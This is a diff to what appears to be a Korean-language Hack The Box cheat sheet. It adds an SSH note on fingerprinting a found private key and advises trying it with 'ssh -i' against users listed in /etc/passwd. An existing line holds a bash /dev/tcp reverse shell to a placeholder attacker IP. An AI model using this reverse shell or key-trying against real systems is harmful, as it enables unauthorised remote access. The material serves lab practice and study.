@@ -56,6 +56,14 @@ download system
 
 # Linux
 
+### SSH
+```bash
+#id_rsa 가 누가 만든것인지
+#신뢰 안 되면 그냥 `/etc/passwd`의 후보 사용자들로 하나씩 `ssh -i` 시도하는 게 확실
+ssh-keygen -l -f id_rsa
+2048 SHA256:PN6pyaVqalSAe2eLdTcog5/dsxHYnOaaDsqKw/vYRPs anthony@clue (RSA)
+```
+
 ## 리버스쉘 페이로드
 ```bash
 bash -i >& /dev/tcp/[내_HTB_IP]/4444 0>&1
